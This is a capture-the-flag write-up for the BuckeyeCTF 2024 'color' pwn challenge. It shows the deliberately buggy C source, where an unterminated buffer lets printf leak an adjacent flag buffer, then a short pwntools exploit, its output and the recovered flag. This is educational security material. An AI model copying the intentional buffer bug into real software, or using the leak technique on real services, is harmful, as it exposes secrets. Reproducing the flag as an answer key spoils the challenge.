# color [246 solves]
### Challenge Description
> What's your favorite color?

`nc challs.pwnoh.io 13370`
### Challenge Author 
> Author: gsemaj
# Challenge Files 
we are given with the source file that was used for compiling the binary.
```c filename=color.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char FAVORITE_COLOR[0x20];
char FLAG[0x28];

void parse_answer(char *dst, char *src) {
    int i = 0;
    while (src[i] != '\n') i++;
    memcpy(dst, src, i);
}

int main() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    memset(FAVORITE_COLOR, 0, 0x20);
    char *envFlag = getenv("FLAG");
    if (envFlag) {
        strcpy(FLAG, envFlag);
    } else {
        strcpy(FLAG, "bctf{fake_flag}");
    }

    char buf[0x60];
    printf("What's your favorite color? ");
    fgets(buf, 0x60, stdin);
    parse_answer(FAVORITE_COLOR, buf);

    printf("%s!?!? Mid af color\n", FAVORITE_COLOR);

    return 0;
}
```
# Solution
## Analysis
first analyse the binary provided to us.
```bash
fooker@fooker:~/buckeyectf2024/pwn/color$ file color
color: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f067b4e3300967a1e4b51df4157d8127f8a52db3, for GNU/Linux 3.2.0, not stripped
fooker@fooker:~/buckeyectf2024/pwn/color$ checksec color
[*] '~/buckeyectf2024/pwn/color/color'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
we are provided with a fully-mitigated `64-bit, dynamically linked` binary. inside the source file, there seem to be two buffers declared globally and therefore, they must reside in the `data section` 
```c
char FAVORITE_COLOR[0x20];
char FLAG[0x28];
```
the `flag` will be loaded into the second buffer and we have a write primitive of size `0x60 bytes` at the location of the first buffer
```c
void parse_answer(char *dst, char *src) {
    int i = 0;
    while (src[i] != '\n') i++;
    memcpy(dst, src, i);
}

int main() {
    ...

    char buf[0x60];
    printf("What's your favorite color? ");
    fgets(buf, 0x60, stdin);

    parse_answer(FAVORITE_COLOR, buf);
    ... 
}
```
## printf() null-byte vulnerability
at the very end, the contents of the first buffer will be printed using `%s` format specifier in `printf`. since `printf` only stops readiin bytes to `stdout` until it reads a nullbyte, therefore we could write exactly `0x20` bytes in the first buffer which would accidentally leak the contents of the second buffer. 

here's the full exploit.
```py
from pwn import *

exe = './color'
elf = context.binary = ELF(exe, checksec=True)

host = 'challs.pwnoh.io'
port = 13370
r = remote(host, port, level='DEBUG')

r.recvuntil(b'color? ')

payload = b'A' * 0x20
r.sendline(payload)

r.interactive()
```
running this exploit leaks the flag as expected
```py
fooker@fooker:~/buckeyectf2024/pwn/color$ python3 exploit.py
[*] '~/buckeyectf2024/pwn/color/color'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challs.pwnoh.io on port 13370: Done
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbctf{1_d0n7_c4r3_571ll_4_m1d_c010r}!?!? Mid af color
[*] Got EOF while reading in interactive
$
```
and there we have our flag.
## Flag
`bctf{1_d0n7_c4r3_571ll_4_m1d_c010r}`
